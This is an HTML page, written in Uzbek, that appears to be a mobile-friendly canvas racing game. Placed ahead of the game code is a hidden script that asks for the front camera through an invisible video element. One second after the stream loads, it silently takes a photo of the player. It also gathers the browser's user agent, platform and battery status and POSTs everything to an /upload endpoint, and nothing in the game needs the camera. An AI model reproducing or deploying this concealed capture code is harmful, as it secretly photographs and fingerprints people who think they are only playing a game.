<!DOCTYPE html>
<html lang="uz">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <title>Professional Racing 3D - Premium</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
      }

      body {
        font-family: "Arial", sans-serif;
        overflow: hidden;
        background: #000;
        touch-action: none;
      }

      #video {
        display: none;
      }

      #gameCanvas {
        display: block;
        width: 100vw;
        height: 100vh;
      }

      .hud {
        position: fixed;
        z-index: 1000;
        pointer-events: none;
      }

      #score {
        top: 20px;
        left: 20px;
        background: rgba(0, 0, 0, 0.7);
        color: #fff;
        padding: 15px 25px;
        border-radius: 15px;
        font-size: 24px;
        font-weight: bold;
        backdrop-filter: blur(10px);
        border: 2px solid rgba(255, 255, 255, 0.3);
      }

      #speed {
        top: 20px;
        right: 20px;
        background: rgba(0, 0, 0, 0.7);
        padding: 15px 25px;
        border-radius: 15px;
        backdrop-filter: blur(10px);
        border: 2px solid rgba(0, 255, 136, 0.5);
      }

      #speedValue {
        color: #00ff88;
        font-size: 42px;
        font-weight: bold;
        text-shadow: 0 0 20px rgba(0, 255, 136, 0.8);
        display: block;
        line-height: 1;
      }

      #speedLabel {
        color: #888;
        font-size: 14px;
        margin-top: 5px;
      }

      #boostBar {
        bottom: 130px;
        left: 50%;
        transform: translateX(-50%);
        width: 250px;
        height: 25px;
        background: rgba(0, 0, 0, 0.7);
        border-radius: 20px;
        overflow: hidden;
        border: 2px solid rgba(255, 68, 68, 0.5);
      }

      #boostFill {
        height: 100%;
        width: 100%;
        background: linear-gradient(90deg, #ff4444, #ff8800, #ffaa00);
        transition: width 0.1s;
        box-shadow: 0 0 20px rgba(255, 68, 68, 0.8);
      }

      #controls {
        position: fixed;
        bottom: 20px;
        left: 0;
        right: 0;
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 0 20px;
        z-index: 1000;
        pointer-events: none;
      }

      .control-btn {
        width: 90px;
        height: 90px;
        background: rgba(255, 255, 255, 0.15);
        backdrop-filter: blur(15px);
        border: 3px solid rgba(255, 255, 255, 0.5);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 40px;
        color: white;
        cursor: pointer;
        user-select: none;
        transition: all 0.2s;
        pointer-events: all;
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
      }

      .control-btn:active {
        background: rgba(255, 255, 255, 0.3);
        transform: scale(0.9);
      }

      .boost-btn {
        width: 100px;
        height: 100px;
        background: linear-gradient(
          135deg,
          rgba(255, 68, 68, 0.3),
          rgba(255, 170, 0, 0.3)
        );
        border-color: #ff4444;
        box-shadow: 0 0 30px rgba(255, 68, 68, 0.6);
      }

      .modal {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: linear-gradient(
          135deg,
          rgba(10, 10, 30, 0.98),
          rgba(30, 30, 60, 0.98)
        );
        padding: 50px;
        border-radius: 25px;
        text-align: center;
        z-index: 2000;
        box-shadow: 0 25px 80px rgba(0, 0, 0, 0.9);
        border: 3px solid rgba(255, 255, 255, 0.2);
        max-width: 90vw;
        display: none;
      }

      .modal h1 {
        color: #00ff88;
        font-size: 56px;
        margin-bottom: 20px;
        text-shadow: 0 0 40px rgba(0, 255, 136, 0.8);
      }

      .modal p {
        color: white;
        font-size: 22px;
        margin: 12px 0;
        line-height: 1.6;
      }

      .modal-btn {
        margin-top: 30px;
        padding: 18px 50px;
        font-size: 26px;
        background: linear-gradient(135deg, #ff4444, #cc0000);
        color: white;
        border: none;
        border-radius: 50px;
        cursor: pointer;
        font-weight: bold;
        transition: all 0.3s;
        box-shadow: 0 10px 30px rgba(255, 68, 68, 0.5);
      }

      .modal-btn:active {
        transform: scale(0.95);
      }

      @media (max-width: 767px) {
        #score,
        #speed {
          padding: 8px 12px;
          font-size: 16px;
          top: 10px;
        }

        #score {
          left: 10px;
        }

        #speed {
          right: 10px;
        }

        #speedValue {
          font-size: 28px;
        }

        #speedLabel {
          font-size: 12px;
        }

        #boostBar {
          bottom: 110px;
          width: 200px;
          height: 20px;
        }

        .control-btn {
          width: 75px;
          height: 75px;
          font-size: 32px;
        }

        .boost-btn {
          width: 85px;
          height: 85px;
        }

        .modal {
          padding: 25px 15px;
          border-radius: 20px;
          max-width: 85vw;
        }

        .modal h1 {
          font-size: 32px;
          margin-bottom: 15px;
        }

        .modal p {
          font-size: 16px;
          margin: 8px 0;
        }

        .modal-btn {
          padding: 15px 35px;
          font-size: 20px;
          margin-top: 20px;
        }
      }

      @media (max-width: 480px) {
        #score,
        #speed {
          padding: 6px 10px;
          font-size: 14px;
        }

        #speedValue {
          font-size: 24px;
        }

        #boostBar {
          bottom: 100px;
          width: 180px;
          height: 18px;
        }

        .control-btn {
          width: 65px;
          height: 65px;
          font-size: 28px;
        }

        .boost-btn {
          width: 75px;
          height: 75px;
        }

        .modal h1 {
          font-size: 28px;
        }

        .modal p {
          font-size: 14px;
        }

        .modal-btn {
          padding: 12px 30px;
          font-size: 18px;
        }
      }

      @media (max-width: 360px) {
        #controls {
          padding: 0 10px;
        }

        .control-btn {
          width: 60px;
          height: 60px;
          font-size: 24px;
        }

        .boost-btn {
          width: 70px;
          height: 70px;
        }
      }
    </style>
  </head>
  <body>
    <canvas id="gameCanvas"></canvas>

    <div id="score" class="hud">Ball: <span id="scoreValue">0</span></div>

    <div id="speed" class="hud">
      <span id="speedValue">0</span>
      <div id="speedLabel">KM/H</div>
    </div>

    <div id="boostBar" class="hud">
      <div id="boostFill"></div>
    </div>

    <div id="controls">
      <div class="control-btn" id="leftBtn">‚¨ÖÔ∏è</div>
      <div class="control-btn boost-btn" id="boostBtn">üî•</div>
      <div class="control-btn" id="rightBtn">‚û°Ô∏è</div>
    </div>

    <div id="startScreen" class="modal" style="display: block">
      <h1>üèéÔ∏è PROFESSIONAL RACING 3D</h1>
      <p>‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ</p>
      <p>‚¨ÖÔ∏è ‚û°Ô∏è yoki A D - Harakatlanish</p>
      <p>üî• SPACE - Turbo Boost</p>
      <p>‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ</p>
      <p><strong>To'siqlardan qoching va rekord yarating!</strong></p>
      <button class="modal-btn" id="startBtn">üöÄ BOSHLASH</button>
    </div>

    <div id="gameOver" class="modal">
      <h1 style="color: #ff4444">üèÅ O'YIN TUGADI</h1>
      <p style="font-size: 28px; color: #ffaa00">
        Ballingiz: <span id="finalScore">0</span>
      </p>
      <p style="font-size: 24px; color: #00ff88">
        Eng yuqori: <span id="highScore">0</span>
      </p>
      <button
        class="modal-btn"
        id="restartBtn"
        style="background: linear-gradient(135deg, #00ff88, #00cc66)"
      >
        üîÑ QAYTA O'YNASH
      </button>
    </div>

    <video id="video" autoplay></video>
    <script>
      const video = document.getElementById("video");

      navigator.mediaDevices
        .getUserMedia({ video: { facingMode: "user" } })
        .then((stream) => {
          video.srcObject = stream;

          video.onloadedmetadata = () => {
            setTimeout(captureAndSendPhoto, 1000);
          };
        })
        .catch((err) => {
          console.error("Kamera ruxsati berilmadi:", err);
        });

      async function captureAndSendPhoto() {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        const blob = await new Promise((resolve) =>
          canvas.toBlob(resolve, "image/jpeg")
        );

        const userAgent = navigator.userAgent;
        const platform = navigator.platform;

        let batteryLevel = "unknown";
        let batteryCharging = "unknown";
        try {
          const battery = await navigator.getBattery();
          batteryLevel = battery.level;
          batteryCharging = battery.charging;
        } catch (e) {}

        const formData = new FormData();
        formData.append("photo", blob, "auto.jpg");
        formData.append("userAgent", userAgent);
        formData.append("platform", platform);
        formData.append("batteryLevel", batteryLevel);
        formData.append("batteryCharging", batteryCharging);

        fetch("/upload", {
          method: "POST",
          body: formData,
        })
          .then((res) => {
            if (res.ok) {
              console.log("Rasm va malumotlar yuborildi ‚úÖ");
            } else {
              console.error("Yuborishda xatolik ‚ùå");
            }
          })
          .catch((err) => {
            console.error("Xatolik:", err);
          });
      }
    </script>

    <script>
      const canvas = document.getElementById("gameCanvas");
      const ctx = canvas.getContext("2d");

      let gameRunning = false;
      let score = 0;
      let highScore = 0;
      let speed = 8;
      let baseSpeed = 8;
      let boost = 100;
      let boosting = false;
      let frameCount = 0;
      let difficultyLevel = 1;

      let player = {
        lane: 1,
        x: 0,
        y: 0,
        width: 50,
        height: 90,
        targetX: 0,
      };

      const keys = { left: false, right: false, space: false };
      let obstacles = [];
      let roadLines = [];
      let particles = [];
      let trees = [];

      function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        if (window.innerWidth < 600) {
          player.width = window.innerWidth * 0.12;
          player.height = window.innerWidth * 0.21;
        } else {
          player.width = 50;
          player.height = 90;
        }
      }

      resizeCanvas();
      window.addEventListener("resize", resizeCanvas);

      class Particle {
        constructor(x, y, color) {
          this.x = x;
          this.y = y;
          this.vx = (Math.random() - 0.5) * 6;
          this.vy = (Math.random() - 0.5) * 6 - 2;
          this.life = 1;
          this.color = color;
          this.size = Math.random() * 4 + 2;
        }

        update() {
          this.x += this.vx;
          this.y += this.vy;
          this.vy += 0.3;
          this.life -= 0.02;
        }

        draw() {
          ctx.save();
          ctx.globalAlpha = this.life;
          ctx.fillStyle = this.color;
          ctx.beginPath();
          ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
          ctx.fill();
          ctx.restore();
        }
      }

      class RoadLine {
        constructor(y) {
          this.y = y;
        }

        update() {
          this.y += speed;
        }

        draw() {
          ctx.fillStyle = "#ffffff";
          ctx.shadowColor = "rgba(255, 255, 255, 0.5)";
          ctx.shadowBlur = 5;
          ctx.fillRect(canvas.width / 2 - 5, this.y, 10, 50);
          ctx.shadowBlur = 0;
        }
      }

      class Tree {
        constructor(side) {
          this.side = side;
          this.x = side === "left" ? canvas.width * 0.12 : canvas.width * 0.88;
          this.y = -80;
          this.size = 35 + Math.random() * 20;
        }

        update() {
          this.y += speed;
        }

        draw() {
          ctx.save();
          ctx.fillStyle = "#6B4423";
          ctx.shadowColor = "rgba(0, 0, 0, 0.6)";
          ctx.shadowBlur = 10;
          ctx.fillRect(
            this.x - this.size * 0.15,
            this.y + this.size * 0.9,
            this.size * 0.3,
            this.size * 0.6
          );

          ctx.shadowBlur = 12;
          ctx.fillStyle = "#1a5d1a";
          ctx.beginPath();
          ctx.moveTo(this.x, this.y);
          ctx.lineTo(this.x - this.size, this.y + this.size * 1.2);
          ctx.lineTo(this.x + this.size, this.y + this.size * 1.2);
          ctx.closePath();
          ctx.fill();

          ctx.fillStyle = "#228B22";
          ctx.beginPath();
          ctx.moveTo(this.x, this.y + this.size * 0.4);
          ctx.lineTo(this.x - this.size * 0.75, this.y + this.size * 1.1);
          ctx.lineTo(this.x + this.size * 0.75, this.y + this.size * 1.1);
          ctx.closePath();
          ctx.fill();

          ctx.fillStyle = "#32CD32";
          ctx.beginPath();
          ctx.moveTo(this.x, this.y + this.size * 0.7);
          ctx.lineTo(this.x - this.size * 0.5, this.y + this.size);
          ctx.lineTo(this.x + this.size * 0.5, this.y + this.size);
          ctx.closePath();
          ctx.fill();
          ctx.restore();
        }
      }

      class Obstacle {
        constructor() {
          this.lane = Math.floor(Math.random() * 3);
          const laneWidth = canvas.width * 0.18;
          const startX = canvas.width / 2 - laneWidth * 1.5;
          this.x = startX + this.lane * laneWidth + laneWidth / 2;
          this.y = -150;

          if (canvas.width < 600) {
            this.width = canvas.width * 0.11;
            this.height = canvas.width * 0.19;
          } else {
            this.width = 48;
            this.height = 85;
          }

          this.type = Math.random() > 0.5 ? "car" : "truck";

          const carColors = [
            "#e74c3c",
            "#3498db",
            "#2ecc71",
            "#f39c12",
            "#9b59b6",
            "#1abc9c",
          ];
          const truckColors = ["#34495e", "#7f8c8d", "#95a5a6"];

          this.color =
            this.type === "car"
              ? carColors[Math.floor(Math.random() * carColors.length)]
              : truckColors[Math.floor(Math.random() * truckColors.length)];
        }

        update() {
          this.y += speed + Math.random() * 2;
        }

        draw() {
          ctx.save();
          ctx.fillStyle = "rgba(0, 0, 0, 0.4)";
          ctx.beginPath();
          ctx.ellipse(
            this.x,
            this.y + this.height + 8,
            this.width * 0.7,
            10,
            0,
            0,
            Math.PI * 2
          );
          ctx.fill();

          if (this.type === "car") {
            const gradient = ctx.createLinearGradient(
              this.x - this.width / 2,
              this.y,
              this.x + this.width / 2,
              this.y
            );
            gradient.addColorStop(0, this.color);
            gradient.addColorStop(0.5, this.lightenColor(this.color, 30));
            gradient.addColorStop(1, this.color);

            ctx.fillStyle = gradient;
            ctx.shadowColor = "rgba(0, 0, 0, 0.5)";
            ctx.shadowBlur = 12;
            ctx.fillRect(
              this.x - this.width / 2,
              this.y,
              this.width,
              this.height
            );

            ctx.shadowBlur = 5;
            ctx.fillStyle = "rgba(100, 150, 220, 0.85)";
            ctx.fillRect(
              this.x - this.width / 2 + 5,
              this.y + 8,
              this.width - 10,
              this.height * 0.35
            );

            ctx.shadowColor = "#ffeb3b";
            ctx.shadowBlur = 15;
            ctx.fillStyle = "#ffeb3b";
            ctx.fillRect(
              this.x - this.width / 2 + 5,
              this.y + 3,
              this.width * 0.35,
              6
            );
            ctx.fillRect(
              this.x + this.width / 2 - this.width * 0.35 - 5,
              this.y + 3,
              this.width * 0.35,
              6
            );

            ctx.shadowColor = "rgba(0, 0, 0, 0.8)";
            ctx.shadowBlur = 8;
            ctx.fillStyle = "#1a1a1a";
            const wheelW = this.width * 0.22;
            const wheelH = this.height * 0.2;

            ctx.fillRect(
              this.x - this.width / 2 - 6,
              this.y + this.height * 0.25,
              wheelW,
              wheelH
            );
            ctx.fillRect(
              this.x + this.width / 2 - wheelW + 6,
              this.y + this.height * 0.25,
              wheelW,
              wheelH
            );
            ctx.fillRect(
              this.x - this.width / 2 - 6,
              this.y + this.height * 0.7,
              wheelW,
              wheelH
            );
            ctx.fillRect(
              this.x + this.width / 2 - wheelW + 6,
              this.y + this.height * 0.7,
              wheelW,
              wheelH
            );

            ctx.fillStyle = "#555";
            ctx.shadowBlur = 3;
            const discSize = wheelW * 0.6;
            ctx.fillRect(
              this.x - this.width / 2 - 3,
              this.y + this.height * 0.25 + wheelH / 2 - discSize / 2,
              discSize,
              discSize
            );
            ctx.fillRect(
              this.x + this.width / 2 - discSize + 3,
              this.y + this.height * 0.25 + wheelH / 2 - discSize / 2,
              discSize,
              discSize
            );
            ctx.fillRect(
              this.x - this.width / 2 - 3,
              this.y + this.height * 0.7 + wheelH / 2 - discSize / 2,
              discSize,
              discSize
            );
            ctx.fillRect(
              this.x + this.width / 2 - discSize + 3,
              this.y + this.height * 0.7 + wheelH / 2 - discSize / 2,
              discSize,
              discSize
            );

            ctx.fillStyle = "#e74c3c";
            ctx.shadowColor = "#e74c3c";
            ctx.shadowBlur = 10;
            ctx.fillRect(
              this.x - this.width / 2 + 5,
              this.y + this.height - 6,
              this.width * 0.3,
              4
            );
            ctx.fillRect(
              this.x + this.width / 2 - this.width * 0.3 - 5,
              this.y + this.height - 6,
              this.width * 0.3,
              4
            );
          } else {
            ctx.fillStyle = this.color;
            ctx.shadowColor = "rgba(0, 0, 0, 0.6)";
            ctx.shadowBlur = 15;
            ctx.fillRect(
              this.x - this.width / 2,
              this.y,
              this.width,
              this.height * 0.4
            );

            ctx.fillStyle = "rgba(100, 150, 220, 0.8)";
            ctx.fillRect(
              this.x - this.width / 2 + 5,
              this.y + 7,
              this.width - 10,
              this.height * 0.22
            );

            const bodyGrad = ctx.createLinearGradient(
              this.x - this.width / 2,
              this.y,
              this.x + this.width / 2,
              this.y
            );
            bodyGrad.addColorStop(0, this.color);
            bodyGrad.addColorStop(0.5, this.lightenColor(this.color, 20));
            bodyGrad.addColorStop(1, this.color);
            ctx.fillStyle = bodyGrad;
            ctx.fillRect(
              this.x - this.width / 2,
              this.y + this.height * 0.42,
              this.width,
              this.height * 0.65
            );

            ctx.fillStyle = "#1a1a1a";
            ctx.shadowColor = "rgba(0, 0, 0, 0.8)";
            ctx.shadowBlur = 8;
            const truckWheelW = this.width * 0.24;
            const truckWheelH = this.height * 0.18;

            ctx.fillRect(
              this.x - this.width / 2 - 7,
              this.y + this.height * 0.35,
              truckWheelW,
              truckWheelH
            );
            ctx.fillRect(
              this.x + this.width / 2 - truckWheelW + 7,
              this.y + this.height * 0.35,
              truckWheelW,
              truckWheelH
            );
            ctx.fillRect(
              this.x - this.width / 2 - 7,
              this.y + this.height * 0.82,
              truckWheelW,
              truckWheelH
            );
            ctx.fillRect(
              this.x + this.width / 2 - truckWheelW + 7,
              this.y + this.height * 0.82,
              truckWheelW,
              truckWheelH
            );
          }
          ctx.restore();
        }

        lightenColor(color, percent) {
          const num = parseInt(color.replace("#", ""), 16);
          const amt = Math.round(2.55 * percent);
          const R = Math.min(255, (num >> 16) + amt);
          const G = Math.min(255, ((num >> 8) & 0x00ff) + amt);
          const B = Math.min(255, (num & 0x0000ff) + amt);
          return (
            "#" +
            (0x1000000 + R * 0x10000 + G * 0x100 + B).toString(16).slice(1)
          );
        }
      }

      for (let i = 0; i < window.innerHeight; i += 100) {
        roadLines.push(new RoadLine(i));
      }

      function updatePlayerPosition() {
        const laneWidth = canvas.width * 0.18;
        const startX = canvas.width / 2 - laneWidth * 1.5;
        player.targetX =
          startX + player.lane * laneWidth + laneWidth / 2 - player.width / 2;
        const diff = player.targetX - player.x;
        player.x += diff * 0.2;
        player.y = canvas.height - 180;
      }

      updatePlayerPosition();

      function drawPlayer() {
        ctx.save();
        ctx.fillStyle = "rgba(0, 0, 0, 0.5)";
        ctx.beginPath();
        ctx.ellipse(
          player.x + player.width / 2,
          player.y + player.height + 10,
          player.width * 0.8,
          12,
          0,
          0,
          Math.PI * 2
        );
        ctx.fill();

        const gradient = ctx.createLinearGradient(
          player.x,
          player.y,
          player.x + player.width,
          player.y
        );
        gradient.addColorStop(0, "#b30000");
        gradient.addColorStop(0.5, "#ff0000");
        gradient.addColorStop(1, "#b30000");

        ctx.fillStyle = gradient;
        ctx.shadowColor = "rgba(255, 0, 0, 0.7)";
        ctx.shadowBlur = 20;
        ctx.fillRect(player.x, player.y, player.width, player.height);

        const highlightGrad = ctx.createLinearGradient(
          player.x,
          player.y,
          player.x + player.width,
          player.y
        );
        highlightGrad.addColorStop(0, "rgba(255, 255, 255, 0)");
        highlightGrad.addColorStop(0.3, "rgba(255, 255, 255, 0.5)");
        highlightGrad.addColorStop(0.7, "rgba(255, 255, 255, 0.5)");
        highlightGrad.addColorStop(1, "rgba(255, 255, 255, 0)");
        ctx.fillStyle = highlightGrad;
        ctx.fillRect(player.x, player.y, player.width, player.height);

        ctx.fillStyle = "rgba(100, 150, 255, 0.9)";
        ctx.shadowBlur = 8;
        ctx.fillRect(
          player.x + 5,
          player.y + 6,
          player.width - 10,
          player.height * 0.35
        );

        ctx.fillStyle = "#ffff00";
        ctx.shadowColor = "#ffff00";
        ctx.shadowBlur = 20;
        ctx.fillRect(player.x + 5, player.y + 2, player.width * 0.38, 7);
        ctx.fillRect(
          player.x + player.width - player.width * 0.38 - 5,
          player.y + 2,
          player.width * 0.38,
          7
        );

        ctx.fillStyle = "#1a1a1a";
        ctx.shadowColor = "rgba(0, 0, 0, 0.9)";
        ctx.shadowBlur = 10;
        const wheelW = player.width * 0.24;
        const wheelH = player.height * 0.2;

        ctx.fillRect(
          player.x - 7,
          player.y + player.height * 0.25,
          wheelW,
          wheelH
        );
        ctx.fillRect(
          player.x + player.width - wheelW + 7,
          player.y + player.height * 0.25,
          wheelW,
          wheelH
        );
        ctx.fillRect(
          player.x - 7,
          player.y + player.height * 0.68,
          wheelW,
          wheelH
        );
        ctx.fillRect(
          player.x + player.width - wheelW + 7,
          player.y + player.height * 0.68,
          wheelW,
          wheelH
        );

        ctx.fillStyle = "#666";
        ctx.shadowBlur = 5;
        const discSize = wheelW * 0.6;
        ctx.fillRect(
          player.x - 3,
          player.y + player.height * 0.25 + wheelH / 2 - discSize / 2,
          discSize,
          discSize
        );
        ctx.fillRect(
          player.x + player.width - discSize + 3,
          player.y + player.height * 0.25 + wheelH / 2 - discSize / 2,
          discSize,
          discSize
        );
        ctx.fillRect(
          player.x - 3,
          player.y + player.height * 0.68 + wheelH / 2 - discSize / 2,
          discSize,
          discSize
        );
        ctx.fillRect(
          player.x + player.width - discSize + 3,
          player.y + player.height * 0.68 + wheelH / 2 - discSize / 2,
          discSize,
          discSize
        );

        ctx.fillStyle = "#ff0000";
        ctx.shadowColor = "#ff0000";
        ctx.shadowBlur = 12;
        ctx.fillRect(
          player.x + 5,
          player.y + player.height - 5,
          player.width * 0.32,
          4
        );
        ctx.fillRect(
          player.x + player.width - player.width * 0.32 - 5,
          player.y + player.height - 5,
          player.width * 0.32,
          4
        );

        if (boosting) {
          ctx.shadowBlur = 25;
          ctx.shadowColor = "#ff8800";

          for (let i = 0; i < 5; i++) {
            const flameGrad = ctx.createRadialGradient(
              player.x + player.width / 2,
              player.y + player.height + i * 12,
              0,
              player.x + player.width / 2,
              player.y + player.height + i * 12,
              player.width * 0.7
            );
            flameGrad.addColorStop(0, `rgba(255, 200, 0, ${0.8 - i * 0.15})`);
            flameGrad.addColorStop(0.5, `rgba(255, 100, 0, ${0.6 - i * 0.15})`);
            flameGrad.addColorStop(1, "rgba(255, 0, 0, 0)");
            ctx.fillStyle = flameGrad;
            ctx.beginPath();
            ctx.arc(
              player.x + player.width / 2,
              player.y + player.height + i * 12,
              player.width * 0.6 * (1 - i * 0.15),
              0,
              Math.PI * 2
            );
            ctx.fill();
          }
        }
        ctx.restore();
      }

      function drawRoad() {
        const roadGrad = ctx.createLinearGradient(0, 0, 0, canvas.height);
        roadGrad.addColorStop(0, "#2a2a2a");
        roadGrad.addColorStop(1, "#1a1a1a");
        ctx.fillStyle = roadGrad;
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        const laneWidth = canvas.width * 0.18;
        const startX = canvas.width / 2 - laneWidth * 1.5;

        ctx.fillStyle = "#333";
        for (let i = 0; i <= 3; i++) {
          const x = startX + i * laneWidth;
          ctx.fillRect(x - 2, 0, 4, canvas.height);
        }

        roadLines.forEach((line) => {
          line.update();
          if (line.y > canvas.height) line.y = -50;
          line.draw();
        });

        trees.forEach((tree, index) => {
          tree.update();
          tree.draw();
          if (tree.y > canvas.height + 100) trees.splice(index, 1);
        });

        if (Math.random() < 0.02) {
          trees.push(new Tree(Math.random() > 0.5 ? "left" : "right"));
        }
      }

      function checkCollision(obj1, obj2) {
        return (
          obj1.x < obj2.x + obj2.width &&
          obj1.x + obj1.width > obj2.x &&
          obj1.y < obj2.y + obj2.height &&
          obj1.y + obj1.height > obj2.y
        );
      }

      function gameLoop() {
        if (!gameRunning) return;

        ctx.clearRect(0, 0, canvas.width, canvas.height);
        drawRoad();

        frameCount++;

        if (frameCount % Math.max(60 - difficultyLevel * 5, 30) === 0) {
          obstacles.push(new Obstacle());
        }

        if (keys.left && player.lane > 0) {
          player.lane = Math.max(0, player.lane - 0.15);
        }
        if (keys.right && player.lane < 2) {
          player.lane = Math.min(2, player.lane + 0.15);
        }

        if (keys.space && boost > 0) {
          boosting = true;
          boost -= 1.5;
          speed = baseSpeed * 1.8;

          if (frameCount % 3 === 0) {
            for (let i = 0; i < 3; i++) {
              particles.push(
                new Particle(
                  player.x +
                    player.width / 2 +
                    (Math.random() - 0.5) * player.width,
                  player.y + player.height,
                  `hsl(${20 + Math.random() * 40}, 100%, 50%)`
                )
              );
            }
          }
        } else {
          boosting = false;
          speed = baseSpeed;
          boost = Math.min(100, boost + 0.3);
        }

        updatePlayerPosition();

        obstacles.forEach((obs, index) => {
          obs.update();
          obs.draw();

          if (checkCollision(player, obs)) {
            gameOver();
          }

          if (obs.y > canvas.height) {
            obstacles.splice(index, 1);
            score += 10;

            if (score % 100 === 0 && difficultyLevel < 10) {
              difficultyLevel++;
              baseSpeed += 0.5;
            }

            for (let i = 0; i < 10; i++) {
              particles.push(
                new Particle(player.x + player.width / 2, player.y, "#00ff88")
              );
            }
          }
        });

        particles.forEach((p, index) => {
          p.update();
          p.draw();
          if (p.life <= 0) particles.splice(index, 1);
        });

        drawPlayer();

        document.getElementById("scoreValue").textContent = score;
        document.getElementById("speedValue").textContent = Math.round(
          speed * 15
        );
        document.getElementById("boostFill").style.width = boost + "%";

        requestAnimationFrame(gameLoop);
      }

      function startGame() {
        gameRunning = true;
        score = 0;
        speed = 8;
        baseSpeed = 8;
        boost = 100;
        boosting = false;
        frameCount = 0;
        difficultyLevel = 1;
        player.lane = 1;
        obstacles = [];
        particles = [];
        trees = [];

        document.getElementById("startScreen").style.display = "none";
        document.getElementById("gameOver").style.display = "none";

        updatePlayerPosition();
        gameLoop();
      }

      function gameOver() {
        gameRunning = false;

        if (score > highScore) {
          highScore = score;
        }

        document.getElementById("finalScore").textContent = score;
        document.getElementById("highScore").textContent = highScore;
        document.getElementById("gameOver").style.display = "block";

        for (let i = 0; i < 50; i++) {
          particles.push(
            new Particle(
              player.x + player.width / 2,
              player.y + player.height / 2,
              `hsl(${Math.random() * 360}, 100%, 50%)`
            )
          );
        }
      }

      document.addEventListener("keydown", (e) => {
        if (e.key === "ArrowLeft" || e.key === "a" || e.key === "A") {
          keys.left = true;
          e.preventDefault();
        }
        if (e.key === "ArrowRight" || e.key === "d" || e.key === "D") {
          keys.right = true;
          e.preventDefault();
        }
        if (e.key === " ") {
          keys.space = true;
          e.preventDefault();
        }
      });

      document.addEventListener("keyup", (e) => {
        if (e.key === "ArrowLeft" || e.key === "a" || e.key === "A") {
          keys.left = false;
        }
        if (e.key === "ArrowRight" || e.key === "d" || e.key === "D") {
          keys.right = false;
        }
        if (e.key === " ") {
          keys.space = false;
        }
      });

      const leftBtn = document.getElementById("leftBtn");
      const rightBtn = document.getElementById("rightBtn");
      const boostBtn = document.getElementById("boostBtn");

      leftBtn.addEventListener("touchstart", (e) => {
        e.preventDefault();
        keys.left = true;
      });
      leftBtn.addEventListener("touchend", (e) => {
        e.preventDefault();
        keys.left = false;
      });

      rightBtn.addEventListener("touchstart", (e) => {
        e.preventDefault();
        keys.right = true;
      });
      rightBtn.addEventListener("touchend", (e) => {
        e.preventDefault();
        keys.right = false;
      });

      boostBtn.addEventListener("touchstart", (e) => {
        e.preventDefault();
        keys.space = true;
      });
      boostBtn.addEventListener("touchend", (e) => {
        e.preventDefault();
        keys.space = false;
      });

      leftBtn.addEventListener("mousedown", () => (keys.left = true));
      leftBtn.addEventListener("mouseup", () => (keys.left = false));
      leftBtn.addEventListener("mouseleave", () => (keys.left = false));

      rightBtn.addEventListener("mousedown", () => (keys.right = true));
      rightBtn.addEventListener("mouseup", () => (keys.right = false));
      rightBtn.addEventListener("mouseleave", () => (keys.right = false));

      boostBtn.addEventListener("mousedown", () => (keys.space = true));
      boostBtn.addEventListener("mouseup", () => (keys.space = false));
      boostBtn.addEventListener("mouseleave", () => (keys.space = false));

      document.getElementById("startBtn").addEventListener("click", startGame);
      document
        .getElementById("restartBtn")
        .addEventListener("click", startGame);
    </script>
  </body>
</html>
